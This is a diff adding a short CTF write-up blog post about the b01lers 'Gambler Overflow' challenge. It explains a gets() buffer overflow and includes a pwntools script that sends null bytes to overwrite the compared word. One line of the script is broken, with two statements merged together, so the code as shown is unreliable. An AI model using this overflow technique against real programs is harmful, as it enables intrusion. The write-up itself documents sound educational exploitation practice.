@@ -1,0 +1,41 @@
+---
+title: Gambler Overflow
+date: '2022-05-31'
+tags: ['ctf', 'b01lers', 'overflow', 'pwn']
+draft: false
+summary: Feeling luuuuuuuucky? You must create a flag.txt in the same folder as the binary for it to run.
+images: []
+layout: PostLayout
+authors: ['circo']
+---
+
+The binary does a `gets()` function call in casino function as seen below.
+
+![Gets Function Call](/static/images/gambler-overflow/1.png)
+
+Supplying an input with length more than 8 characters overwrites the correct word.
+
+![Word Overwrite](/static/images/gambler-overflow/2.png)
+
+The exploit script used:
+
+```python
+from pwn import *
+#adapt for remote
+p = process("/mnt/d/things/gambler_overflow")
+#a = p.recvuntil(b"s:")
+for i in range (90):
+    print('a')
+    a = p.recvuntil(b"s:")
+    print(a) p.send(b"\x00" * 9 + b"\r\n")
+    print(p.recvline())
+    print(p.recvline())
+print(p.recvline())
+print(p.recvline())
+p.close()
+```
+
+Putting in 9 `null` bytes just matches everything
+so it works :D
+
+![Fake Flag Output](/static/images/gambler-overflow/3.png)
